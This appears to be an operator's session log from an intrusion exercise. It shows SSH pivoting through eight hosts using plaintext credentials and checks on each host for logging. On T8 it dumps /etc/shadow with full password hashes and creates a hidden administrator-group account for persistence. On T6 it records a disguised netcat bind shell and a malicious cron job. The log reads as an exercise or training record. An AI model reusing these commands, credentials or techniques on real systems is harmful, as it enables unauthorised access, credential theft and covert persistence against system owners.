@@ -1,0 +1,605 @@
+Date:2024-05-21 
+Start time: 0900
+End time: 1500
+
+------------------------
+SOM
+------------------------
+>T1: 10.50.34.234
+->T2: 10.20.169.30
+-->T3: 10.20.169.239
+--->T4: 192.186.169.133*PACCT
+---->T5: 192.186.169.201*
+---->T6: 192.186.169.134
+---->T7: 192.186.169.144
+---->T8: 192.186.169.142
+------------------------
+Creds
+------------------------
+engineer14::enshallah
+caisson14::tread_depth
+NOC_Admin14::AhmdLxu29D
+askar14::DaXedayLasarah
+=========================
+T1: >10.50.34.234
+=========================
+X-----------------------
+2024-05-21 09:01:07-- connection to T1; start vetting
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer14@10.50.34.234 -p 10123
+enshallah
+
+fa:16:3e:84:f4:d4
+10.20.169.195
+2024-05-21 09:02:15-- date
+Tue May 21 13:02:11 UTC 2024
+Tue May 21 13:02:11 UTC 2024
+
+4 S root        9052       1  0  80   0 - 54654 -      May17 ?        00:00:15   /usr/sbin/rsyslogd -n
+udp           UNCONN            0.0.0.0:34039                          0.0.0.0:*              users:(("rsyslogd",pid=9052,fd=5))
+-rw-rw-r--.  1 root   utmp    33408 May 21 13:02 wtmp
+-rw-rw-r--.  1 root   utmp   299300 May 21 13:02 lastlog
+-rw-------.  1 root   root    82956 May 21 13:03 messages
+-rw-------.  1 root   root   132419 May 21 13:04 secure
+/var/log/audit/audit.log
+
+2024-05-21 09:07:59-- vetting complete-all clear; redirecting to T2
+
+
+2024-05-21 14:14:15-- start exit vetting
+2024-05-21 14:16:20-- exit vetting complete; disconnect from T1
+
+Logged In: utmp,wtmp,lastlog,messages,secure,audit.log
+------------------------X
+=========================
+
+=========================
+T2: ->10.20.169.30
+=========================
+X-----------------------
+2024-05-21 09:09:47-- connection to T2; start vetting
+ssh -S /tmp/T1 -O forward -L 127.0.0.1:2002:10.20.169.30:52203 dummy
+ssh -MS /tmp/T2 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null caisson14@127.0.0.1 -p 2002
+tread_depth
+
+FA-16-3E-24-F8-3B
+10.20.169.30
+2024-05-21 09:10:41-- date
+Tue 05/21/2024
+01:10 PM
+administrator         console             1  Active      none   5/21/2024 12:02 PM
+taskhostw.exe                 2388 Console                    1      9,520 K Unknown         STORAGE2\Administrator              0:00:00 N/A
+cmd.exe                        500 Console                    1      3,692 K Unknown         STORAGE2\Administrator              0:00:00 N/A
+conhost.exe                   3852 Console                    1     13,488 K Unknown         STORAGE2\Administrator              0:00:00 N/A
+
+2024-05-21 09:21:55-- vetting complete; redirecting to T3
+2024-05-21 14:07:01-- start exit vetting
+sshd.exe                      2348 Services                   0      7,308 K Unknown         STORAGE2\caisson14                     0:00:01 N/A
+conhost.exe                    828 Services                   0      5,340 K Unknown         STORAGE2\caisson14                     0:00:00 N/A
+cmd.exe                       3608 Services                   0      3,992 K Unknown         STORAGE2\caisson14                     0:00:00 N/A
+sshd.exe                      4944 Services                   0      7,220 K Unknown         STORAGE2\caisson14                     0:00:00 N/A
+conhost.exe                   4960 Services                   0      5,124 K Unknown         STORAGE2\caisson14                     0:00:00 N/A
+cmd.exe                       4984 Services                   0      4,108 K Unknown         STORAGE2\caisson14                     0:00:00 N/A
+tasklist.exe                  4536 Services                   0      7,632 K Unknown         STORAGE2\caisson14                     0:00:00 N/A
+findstr.exe                   4532 Services                   0      3,148 K Unknown         STORAGE2\caisson14                     0:00:00 N/A
+
+
+2024-05-21 14:13:50-- exit vetting complete; disconnect from T2
+
+Logged In: Security
+------------------------X
+=========================
+
+=========================
+T3: -->10.20.169.239
+=========================
+X-----------------------
+2024-05-21 09:22:25-- connection to T3; start vetting
+ssh -S /tmp/T2 -O forward -L 127.0.0.1:2003:10.20.169.239:52230 dummy
+ssh -MS /tmp/T3 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_Admin14@127.0.0.1 -p 2003
+AhmdLxu29D
+
+2024-05-21 09:23:44-- date
+Tue May 21 13:23:41 UTC 2024
+Tue May 21 13:23:41 UTC 2024
+
+5 S root      3552     1  0  80   0 - 29938 ?      May09 ?        00:00:00   /usr/sbin/rsyslogd -c4
+-rw-rw-r--  1 root     utmp       51840 May 21 13:24 wtmp
+-rw-rw-r--  1 root     utmp      299300 May 21 13:24 lastlog
+-rw-r-----  1 root     adm       226737 May 21 13:25 auth.log
+
+2024-05-21 09:28:33-- vetting complete; clean box; redirecting to T4
+2024-05-21 14:05:00-- start exit vetting
+2024-05-21 14:06:38-- exit vetting complete; disconnect from T3
+
+Logged In: utmp, wtmp, lastlog, auth.log, messages
+------------------------X
+=========================
+
+=========================
+T4: --->192.186.169.133*PACCT
+=========================
+X-----------------------
+2024-05-21 09:29:27-- connection to T4; start vetting
+ssh -S /tmp/T3 -O forward -L 127.0.0.1:2004:192.186.169.133:33517 dummy
+ssh -MS /tmp/T4 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1 -p 2004
+DaXedayLasarah
+
+2024-05-21 09:30:37-- date
+Tue May 21 13:30:35 UTC 2024
+Tue May 21 13:30:35 UTC 2024
+
+/root/Sup3rS3cr3t
+4 S root         896       1  0  80   0 - 60327 -      May09 ?        00:00:57   /usr/sbin/rsyslogd -n
+/var/account/pacct
+-rw-rw-r--.  1 root   utmp     33408 May 21 13:31 wtmp
+-rw-rw-r--.  1 root   utmp    299300 May 21 13:31 lastlog
+-rw-------.  1 root   root     94864 May 21 13:31 messages
+-rw-------.  1 root   root    154456 May 21 13:32 secure
+/var/log/audit/audit.log
+
+2024-05-21 09:36:24-- vetting complete-clear minus the pacct; redirecting to T5
+
+2024-05-21 14:03:03-- start exit vetting
+2024-05-21 14:04:25-- exit vetting complete; disconnect from T4
+
+Logged In: utmp, wtmp, lastlog, messages, secure, audit.log, pacct
+------------------------X
+=========================
+
+=========================
+T5: ---->192.186.169.201
+=========================
+X-----------------------
+2024-05-21 09:39:06-- connection to T5; start vetting
+ssh -S /tmp/T4 -O forward -L 127.0.0.1:2005:192.186.169.201:44714 dummy
+nc -nv 127.0.0.1 2005
+
+fa:16:3e:ad:4f:68
+192.186.169.201
+radicle  tty1     -                12:05    1:28m  0.08s  0.01s ssh -p 33715 root@129.168.169.186
+radicle  - tty1         2024-05-21 12:05 01:29        5246
+2024-05-21 09:40:53-- date
+Tue May 21 13:40:52 UTC 2024
+Tue May 21 13:40:52 UTC 2024
+
+4 S root      1677     1  0  80   0 - 19692 -      May20 tty1     00:00:00   /bin/login -p --
+4 S radicle   5246  1677  0  80   0 -  5808 -      12:05 tty1     00:00:00     -bash
+4 T root      5262  5246  0  80   0 - 17075 -      12:06 tty1     00:00:00       sudo tcpdump -i ens4 -w /var/log/tcpdump2.pcap
+0 S radicle   5268  5246  0  80   0 - 12285 -      12:10 tty1     00:00:00       ssh -p 33715 root@129.168.169.186
+4 S syslog     928     1  0  80   0 - 66820 -      May20 ?        00:00:00   /usr/sbin/rsyslogd -n
+
+-rw-r-----   1 syslog    adm              51151 May 21 13:44 auth.log
+*.* @@129.168.169.186:514
+
+2024-05-21 10:02:35-- vetting complete
+cat /etc/passwd	
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+askar1:x:1001:27::/home/useraccounts/askar1:/bin/bash
+askar2:x:1002:27::/home/useraccounts/askar2:/bin/bash
+askar3:x:1003:27::/home/useraccounts/askar3:/bin/bash
+askar4:x:1004:27::/home/useraccounts/askar4:/bin/bash
+askar5:x:1005:27::/home/useraccounts/askar5:/bin/bash
+askar6:x:1006:27::/home/useraccounts/askar6:/bin/bash
+askar7:x:1007:27::/home/useraccounts/askar7:/bin/bash
+askar8:x:1008:27::/home/useraccounts/askar8:/bin/bash
+askar9:x:1009:27::/home/useraccounts/askar9:/bin/bash
+askar10:x:1010:27::/home/useraccounts/askar10:/bin/bash
+askar11:x:1011:27::/home/useraccounts/askar11:/bin/bash
+askar12:x:1012:27::/home/useraccounts/askar12:/bin/bash
+askar13:x:1013:27::/home/useraccounts/askar13:/bin/bash
+askar14:x:1014:27::/home/useraccounts/askar14:/bin/bash
+askar15:x:1015:27::/home/useraccounts/askar15:/bin/bash
+askar16:x:1016:27::/home/useraccounts/askar16:/bin/bash
+askar17:x:1017:27::/home/useraccounts/askar17:/bin/bash
+askar18:x:1018:27::/home/useraccounts/askar18:/bin/bash
+askar19:x:1019:27::/home/useraccounts/askar19:/bin/bash
+askar20:x:1020:27::/home/useraccounts/askar20:/bin/bash
+askar21:x:1021:27::/home/useraccounts/askar21:/bin/bash
+askar22:x:1022:27::/home/useraccounts/askar22:/bin/bash
+askar23:x:1023:27::/home/useraccounts/askar23:/bin/bash
+radicle:x:1025:27::/home/useraccounts/radicle:/bin/bash
+cat /etc/group
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:syslog,ubuntu
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:ubuntu
+fax:x:21:
+voice:x:22:
+cdrom:x:24:ubuntu
+floppy:x:25:ubuntu
+tape:x:26:
+sudo:x:27:ubuntu
+audio:x:29:ubuntu
+dip:x:30:ubuntu
+www-data:x:33:
+backup:x:34:
+operator:x:37:
+list:x:38:
+irc:x:39:
+src:x:40:
+gnats:x:41:
+shadow:x:42:
+utmp:x:43:
+video:x:44:ubuntu
+sasl:x:45:
+plugdev:x:46:ubuntu
+staff:x:50:
+games:x:60:
+users:x:100:
+nogroup:x:65534:
+systemd-journal:x:101:
+systemd-network:x:102:
+systemd-resolve:x:103:
+input:x:104:
+crontab:x:105:
+syslog:x:106:
+messagebus:x:107:
+lxd:x:108:ubuntu
+mlocate:x:109:
+uuidd:x:110:
+ssh:x:111:
+landscape:x:112:
+admin:x:113:
+netdev:x:114:ubuntu
+ubuntu:x:1000:
+
+2024-05-21 10:05:42-- start exit vetting
+2024-05-21 10:09:00-- exit vetting complete; disconnect from T5
+
+
+Logged In: auth.log, rsyslog
+-----------------------X
+=========================
+4-6
+=========================
+T6: ---->192.186.169.134
+=========================
+X-----------------------
+2024-05-21 10:12:11-- connection to T6; start vetting
+ssh -S /tmp/T4 -O forward -L 127.0.0.1:2006:192.186.169.134:33715 dummy
+ssh -MS /tmp/T6 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1 -p 2006
+DaXedayLasarah
+
+fa:16:3e:89:d9:f8
+192.186.169.134
+radicle  pts/0    192.186.169.133  12:12    3:02   0.61s  0.61s -bash
+radicle  + pts/0        2024-05-21 12:12 00:03        9083 (192.186.169.133)
+2024-05-21 10:14:18-- date
+Tue May 21 14:14:16 UTC 2024
+Tue May 21 14:14:16 UTC 2024
+/
+drwxr-xr-x   2 root root  4096 May 21 12:24 .malice
+4 S root         433       1  0  80   0 -  3853 -      01:03 ?        00:00:00   sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+4 S root        9083     433  0  80   0 -  4347 -      12:12 ?        00:00:00     sshd: radicle [priv]
+5 S radicle     9097    9083  0  80   0 -  4412 -      12:12 ?        00:00:00       sshd: radicle@pts/0
+0 S radicle     9098    9097  0  80   0 -  4302 -      12:12 pts/0    00:00:00         -bash
+0 S radicle     9230    9098  0  80   0 -  3300 -      12:15 pts/0    00:00:00           /bin/svchost.exe -knvlp 31337 -e /bin/bash
+tcp6       0      0 :::31337                :::*                    LISTEN      9230/svchost.exe    
+tcp        0      0 192.186.169.134:33715   192.186.169.133:34810   ESTABLISHED 9083/sshd: radicle  
+-rw-rw-r--   1 root        utmp              9216 May 21 14:16 wtmp
+-rw-rw-r--   1 root        utmp            299300 May 21 14:16 lastlog
+/var/log/journal/c00c28b29595449eaddfabc3cfd27b79/user-1014.journal
+/etc/cron.hourly/malice.cron
+#!/bin/bash
+/.malice/malice.sh
+
+2024-05-21 10:59:26-- vetting complete; starting survey
+2024-05-21 11:02:00-- survey complete; start exit vetting
+2024-05-21 11:04:50-- exit vetting complete; disconnect from T6
+
+Logged In: utmp, wtmp, lastlog, user-1014.journal
+-----------------------X
+=========================
+4-7
+=========================
+T7: ---->192.186.169.144
+=========================
+X-----------------------
+2024-05-21 11:06:09-- connection to T7; start vetting
+ssh -S /tmp/T4 -O forward -L 127.0.0.1:2007:192.186.169.144:33715 dummy
+ssh -MS /tmp/T7 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1 -p 2007
+DaXedayLasarah
+
+FA-16-3E-81-76-9C
+192.186.169.144
+2024-05-21 11:06:57-- date
+Tue 05/21/2024
+03:06 PM
+administrator         console             1  Active      none   5/20/2024 12:30 AM
+explorer.exe                  5252 Console                    1    119,852 K Unknown         DESKTOP-USER27\Administrator        0:00:15 N/A
+C:\Program Files (x86)\Avira\
+HKEY_LOCAL_MACHINE\software\BullGuard Ltd.
+Task To Run:                          C:\WINDOWS\system32\net.exe start AviraSecurityUpdater
+Task To Run:                          C:\WINDOWS\system32\sc.exe start AviraFallbackUpdater Delayed=false
+c:\avira.exe
+"c:\Program Files\Avira\Endpoint Protection SDK"
+"c:\Program Files (x86)\Avira\Security"
+"c:\Program Files (x86)\Avira\VPN"
+"c:\Program Files (x86)\Avira\System Speedup"   
+
+2024-05-21 11:58:50-- vetting complete; start survey
+2024-05-21 12:04:34-- survey complete; start exit vetting
+2024-05-21 12:09:45-- exit vetting complete; disconnect from T7
+
+Logged In: Security, Application
+-----------------------X
+=========================
+4-8
+=========================
+T8: ---->192.186.169.142
+=========================
+X-----------------------
+2024-05-21 12:13:15-- connection to T8; start vetting
+ssh -S /tmp/T4 -O forward -L 127.0.0.1:2008:192.186.169.142:33715 dummy
+ssh -MS /tmp/T8 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null askar14@127.0.0.1 -p 2008
+DaXedayLasarah
+
+fa:16:3e:ed:54:8b
+192.186.169.142
+2024-05-21 12:14:50-- date
+Tue May 21 16:14:47 UTC 2024
+Tue May 21 16:14:47 UTC 2024
+drwx------.  2 radicle       wheel         4096 May 21 01:10 radicle
+drwx------.  2 c.alvarez.59  c.alvarez.59  4096 May 21 01:10 c.alvarez.59
+drwx------.  2 t.peterson.22 t.peterson.22 4096 May 21 01:10 t.peterson.22
+drwx------.  2 s.hall.61     s.hall.61     4096 May 21 01:10 s.hall.61
+drwx------.  2 m.howard.25   m.howard.25   4096 May 21 01:10 m.howard.25
+drwx------.  2 n.ramirez.27  n.ramirez.27  4096 May 21 01:10 n.ramirez.27
+drwx------.  2 s.brown.30    s.brown.30    4096 May 21 01:10 s.brown.30
+drwx------.  2 a.zhang.20    a.zhang.20    4096 May 21 01:10 a.zhang.20
+drwx------.  2 d.knight.67   d.knight.67   4096 May 21 01:10 d.knight.67
+drwx------.  2 k.james.25    k.james.25    4096 May 21 01:10 k.james.25
+drwx------.  2 w.shaw.73     w.shaw.73     4096 May 21 01:10 w.shaw.73
+drwx------.  2 j.omoore.18   j.omoore.18   4096 May 21 01:10 j.omoore.18
+drwx------.  2 s.wood.59     s.wood.59     4096 May 21 01:10 s.wood.59
+
+4 S root      1702     1  0  80   0 - 51295 -      01:11 ?        00:00:02   /usr/sbin/rsyslogd -n
+udp           UNCONN                  0.0.0.0:48464                           0.0.0.0:*              users:(("rsyslogd",pid=1702,fd=5))                 
+-rw-rw-r--.  1 root   utmp              13056 May 21 16:13 wtmp
+-rw-rw-r--.  1 root   utmp             302804 May 21 16:13 lastlog
+-rw-------.  1 root   root              34504 May 21 16:18 secure
+-rw-------.  1 root   root             882446 May 21 16:18 messages
+/var/log/audit/audit.log
+Current mode:                   enforcing
+Max kernel policy version:      31
+/etc/rsyslog.conf
+*.* @remote-host:1514
+192.186.169.201 remote-host
+
+2024-05-21 13:09:37-- vetting complete; start survey
+
+[askar14@DESKTOP-USER24 ~]$ sudo cat /etc/shadow
+root:$6$d3dsG/pPf$cT1QpqS5oE.ruF7N6Uqaf9/d9jCbWtdSYswCrdt921AR7aMDtIydAy4./s81Y8qnoUTQc9gaAGbDbXInVzwtS0:19864:0:99999:7:::
+bin:*:17725:0:99999:7:::
+daemon:*:17725:0:99999:7:::
+adm:*:17725:0:99999:7:::
+lp:*:17725:0:99999:7:::
+sync:*:17725:0:99999:7:::
+shutdown:*:17725:0:99999:7:::
+halt:*:17725:0:99999:7:::
+mail:*:17725:0:99999:7:::
+operator:*:17725:0:99999:7:::
+games:*:17725:0:99999:7:::
+ftp:*:17725:0:99999:7:::
+nobody:*:17725:0:99999:7:::
+dbus:!!:17828::::::
+systemd-coredump:!!:17828::::::
+systemd-network:!!:17828::::::
+systemd-resolve:!!:17828::::::
+tss:!!:17828::::::
+polkitd:!!:17828::::::
+unbound:!!:17828::::::
+sshd:!!:17828::::::
+chrony:!!:17828::::::
+fedora:!!:19852:0:99999:7:::
+askar1:$1$JLpHyQs2$oYMy7PymTS29OxLRyEUOP0:19864:0:99999:7:::
+askar2:$1$E76gqVW/$Yxhh.Z/N6hHnzVdSqowUL/:19864:0:99999:7:::
+askar3:$1$KMEzfYOA$Umk1I0TVP3/9b1PNvo6MY/:19864:0:99999:7:::
+askar4:$1$Lnsovmla$IDGIikDmMBCDRWBbEpzXq0:19864:0:99999:7:::
+askar5:$1$jt82/AnD$qBp94YxEsqqN521HQgCM1.:19864:0:99999:7:::
+askar6:$1$W/mM0yus$WFmgw7p4mHDxH0Q19gCIT/:19864:0:99999:7:::
+askar7:$1$orvUvzDn$dJ81miEuVoHfTqx.tBjXI0:19864:0:99999:7:::
+askar8:$1$Zui.Nqf6$Oq4/MhxDw0yKo6NQSFB40.:19864:0:99999:7:::
+askar9:$1$Rj0gvuPs$Pb5RSabt/SsEFfLiqA/oN/:19864:0:99999:7:::
+askar10:$1$.//mFf6Q$n9tkxyOaOwsncS3Nd4CGM1:19864:0:99999:7:::
+askar11:$1$8K.Vynqj$i1lHE9ZXMr3gcUHrEtcoR.:19864:0:99999:7:::
+askar12:$1$AkTuVSTA$oGzX5hfNGHQRUYGqo2C/P/:19864:0:99999:7:::
+askar13:$1$WwAw6KZ7$VflNCuT8zG0VvjCSWUm.d0:19864:0:99999:7:::
+askar14:$1$JGsEovLR$J66uuEytHOf4z0unY8Nkd1:19864:0:99999:7:::
+askar15:$1$Nb9dmi9F$IgaeqTEcs2KVnuk296t061:19864:0:99999:7:::
+askar16:$1$AHqk/3oy$caDKo1gfcaaRwAGrVUeQz/:19864:0:99999:7:::
+askar17:$1$aWWvL1H8$M9mXM37.kB94M8yu4P5pX0:19864:0:99999:7:::
+askar18:$1$.6AyA4Dn$7Oim9ff4e3UiIXSTdjuh8/:19864:0:99999:7:::
+askar19:$1$ptiXGyqX$iVgLeBV1z3eBE2rUO3wpB0:19864:0:99999:7:::
+askar20:$1$tR8Uwfol$orykv7r9I.hjUY9vBzUUy/:19864:0:99999:7:::
+askar21:$1$wTE96t8e$Na.sG8SK5jfPsOJ0E1Sq20:19864:0:99999:7:::
+askar22:$1$TKls7K8v$Kjnj/YLwvSKX0cdyuZ5sz/:19864:0:99999:7:::
+askar23:$1$dROeB/74$9iYulELLDyDrOa3JHtphJ.:19864:0:99999:7:::
+radicle:$1$QAtVIfh.$NU5Yqqn3B51OE8q0qfCcx.:19864:0:99999:7:::
+c.alvarez.59:$1$uuuhfs52$IUXVGGMjmVRqt/iDrqoSM/:19864:0:99999:7:::
+t.peterson.22:$1$px3AVdCF$EKwf4DiozPFoViRX/FizF.:19864:0:99999:7:::
+s.hall.61:$1$4R4C2aCx$60p8JM15v1ONq.yX4g9zh/:19864:0:99999:7:::
+m.howard.25:$1$Tjtp3ixt$gZAG6sq0vp1.cR3Wd0FE71:19864:0:99999:7:::
+n.ramirez.27:$1$D6GtF8GX$zeORKxsTMi6bcFQ9mBs4a0:19864:0:99999:7:::
+s.brown.30:$1$NktzXggB$BM2PGLSBS/JfdCp73ehOS1:19864:0:99999:7:::
+a.zhang.20:$1$umDDL1dJ$T.za.V5tsFBUgHbss4jfp.:19864:0:99999:7:::
+d.knight.67:$1$l05o5XBi$bdzFROoOFDat43pHlhZZX/:19864:0:99999:7:::
+k.james.25:$1$T7XdxmJm$weljY5/Yr8ShozxN/.LhQ0:19864:0:99999:7:::
+w.shaw.73:$1$Q8X7V88c$q9HMCh0cl1O0pu.TBd4m61:19864:0:99999:7:::
+j.omoore.18:$1$XtLwLmUZ$YNRtmTnuMmwslBxMLI9zF0:19864:0:99999:7:::
+s.wood.59:$1$Ito9Po7T$sOschzWyXTith6Ch8of17/:19864:0:99999:7:::
+a.graham.07:$6$4AXgE/EGXZfDLgBo$z2zW0f8xsuU5NwIW7DN8RhakxM9.fJgo7RMQ5QnmdqCJseOoWnjwAg/LuxbwD4QBns4zFmhKdJW/EXlJ1bTQT0:19864:0:99999:7:::
+
+[askar14@DESKTOP-USER24 ~]$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+polkitd:x:998:996:User for polkitd:/:/sbin/nologin
+unbound:x:997:995:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+chrony:x:996:993::/var/lib/chrony:/sbin/nologin
+fedora:x:1000:1000:fedora Cloud User:/home/fedora:/bin/bash
+askar1:x:1001:10::/home/useraccounts/askar1:/bin/bash
+askar2:x:1002:10::/home/useraccounts/askar2:/bin/bash
+askar3:x:1003:10::/home/useraccounts/askar3:/bin/bash
+askar4:x:1004:10::/home/useraccounts/askar4:/bin/bash
+askar5:x:1005:10::/home/useraccounts/askar5:/bin/bash
+askar6:x:1006:10::/home/useraccounts/askar6:/bin/bash
+askar7:x:1007:10::/home/useraccounts/askar7:/bin/bash
+askar8:x:1008:10::/home/useraccounts/askar8:/bin/bash
+askar9:x:1009:10::/home/useraccounts/askar9:/bin/bash
+askar10:x:1010:10::/home/useraccounts/askar10:/bin/bash
+askar11:x:1011:10::/home/useraccounts/askar11:/bin/bash
+askar12:x:1012:10::/home/useraccounts/askar12:/bin/bash
+askar13:x:1013:10::/home/useraccounts/askar13:/bin/bash
+askar14:x:1014:10::/home/useraccounts/askar14:/bin/bash
+askar15:x:1015:10::/home/useraccounts/askar15:/bin/bash
+askar16:x:1016:10::/home/useraccounts/askar16:/bin/bash
+askar17:x:1017:10::/home/useraccounts/askar17:/bin/bash
+askar18:x:1018:10::/home/useraccounts/askar18:/bin/bash
+askar19:x:1019:10::/home/useraccounts/askar19:/bin/bash
+askar20:x:1020:10::/home/useraccounts/askar20:/bin/bash
+askar21:x:1021:10::/home/useraccounts/askar21:/bin/bash
+askar22:x:1022:10::/home/useraccounts/askar22:/bin/bash
+askar23:x:1023:10::/home/useraccounts/askar23:/bin/bash
+radicle:x:1024:10::/home/useraccounts/radicle:/bin/bash
+c.alvarez.59:x:1025:1025:desperate superhero:/home/useraccounts/c.alvarez.59:/bin/bash
+t.peterson.22:x:1026:1026:nosy monarch:/home/useraccounts/t.peterson.22:/bin/bash
+s.hall.61:x:1027:1027:disturbed French student:/home/useraccounts/s.hall.61:/bin/bash
+m.howard.25:x:1028:1028:smart biology student:/home/useraccounts/m.howard.25:/bin/bash
+n.ramirez.27:x:1029:1029:funny man:/home/useraccounts/n.ramirez.27:/bin/bash
+s.brown.30:x:1030:1030:greedy professor:/home/useraccounts/s.brown.30:/bin/bash
+a.zhang.20:x:1031:1031:terrible zombie:/home/useraccounts/a.zhang.20:/bin/bash
+d.knight.67:x:1032:1032:vulgar professor:/home/useraccounts/d.knight.67:/bin/bash
+k.james.25:x:1033:1033:outspoken woman:/home/useraccounts/k.james.25:/bin/bash
+w.shaw.73:x:1034:1034:fine vampire:/home/useraccounts/w.shaw.73:/bin/bash
+j.omoore.18:x:1035:1035:respectable mother:/home/useraccounts/j.omoore.18:/bin/bash
+s.wood.59:x:1036:1036:bad programmer:/home/useraccounts/s.wood.59:/bin/bash
+a.graham.07:x:1047:1047:embarrassed musician:/home/useraccounts/a.graham.07:/bin/bash
+
+[askar14@DESKTOP-USER24 ~]$ cat /etc/group
+root:x:0:
+bin:x:1:
+daemon:x:2:
+sys:x:3:
+adm:x:4:fedora
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mem:x:8:
+kmem:x:9:
+wheel:x:10:fedora,a.graham.07
+cdrom:x:11:
+mail:x:12:
+man:x:15:
+dialout:x:18:
+floppy:x:19:
+games:x:20:
+tape:x:33:
+video:x:39:
+ftp:x:50:
+lock:x:54:
+audio:x:63:
+users:x:100:
+nobody:x:65534:
+dbus:x:81:
+utmp:x:22:
+utempter:x:35:
+input:x:999:
+kvm:x:36:
+render:x:998:
+systemd-journal:x:190:fedora
+systemd-coredump:x:997:
+systemd-network:x:192:
+systemd-resolve:x:193:
+tss:x:59:
+polkitd:x:996:
+unbound:x:995:
+ssh_keys:x:994:
+sshd:x:74:
+chrony:x:993:
+fedora:x:1000:
+c.alvarez.59:x:1025:
+t.peterson.22:x:1026:
+s.hall.61:x:1027:
+m.howard.25:x:1028:
+n.ramirez.27:x:1029:
+s.brown.30:x:1030:
+a.zhang.20:x:1031:
+d.knight.67:x:1032:
+k.james.25:x:1033:
+w.shaw.73:x:1034:
+j.omoore.18:x:1035:
+s.wood.59:x:1036:
+a.graham.07:x:1047:
+
+2024-05-21 13:14:41-- survey complete
+
+2024-05-21 13:47:58-- create user
+sudo useradd -md /home/useraccounts/c.puller.14 -c "brave beast" -p DaXedayLasarah c.puller.14
+DaXedayLasarah
+sudo usermod -aG wheel c.puller.14
+echo 'c.puller.14:DaXedayLasarah' | sudo chpasswd --crypt-method MD5
+groups c.puller.14
+2024-05-21 13:51:48-- user verified
+2024-05-21 14:00:54-- start exit vetting
+2024-05-21 14:02:16-- exit vetting complete; disconnect from T8
+
+Logged In: wtmp, utmp, lastlog, secure, messages, audit.log, rsyslog
+------------------------X
+=========================
